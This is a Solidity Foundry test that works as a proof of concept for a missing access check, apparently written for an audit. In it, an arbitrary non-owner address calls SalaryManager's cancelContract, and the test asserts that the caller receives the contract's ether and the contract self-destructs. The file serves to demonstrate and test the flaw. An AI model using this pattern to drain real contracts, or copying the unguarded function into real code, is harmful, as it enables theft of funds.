
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager private salaryManager;
    address private owner;

    function setUp() public {
        owner = address(this);
        salaryManager = new SalaryManager();
        
        // Fund the contract to satisfy the require condition in cancelContract
        // _totalAllocated starts at 0, so we need address(this).balance > 0
        vm.deal(address(salaryManager), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner (the only privileged role)
        vm.assume(caller != owner);

        // --- 2. State Configuration ---
        // The contract is already funded in setUp()
        // _totalAllocated is 0 and balance is 1 ether, so require(_totalAllocated < address(this).balance) passes

        // --- 3. Execution & Assertion ---
        
        // Record the caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(salaryManager).balance;
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the vulnerable cancelContract function
        // If vulnerable: call succeeds, contract self-destructs, funds go to caller
        // If secure: call reverts with access control error
        salaryManager.cancelContract();

        // Assert that the attack succeeded - caller received the contract's funds
        assertEq(caller.balance, callerBalanceBefore + contractBalance, "Caller should receive contract funds");
        
        // Assert that the contract was destroyed (code size is 0)
        uint256 codeSize;
        address target = address(salaryManager);
        assembly {
            codeSize := extcodesize(target)
        }
        assertEq(codeSize, 0, "Contract should be destroyed");
    }
}
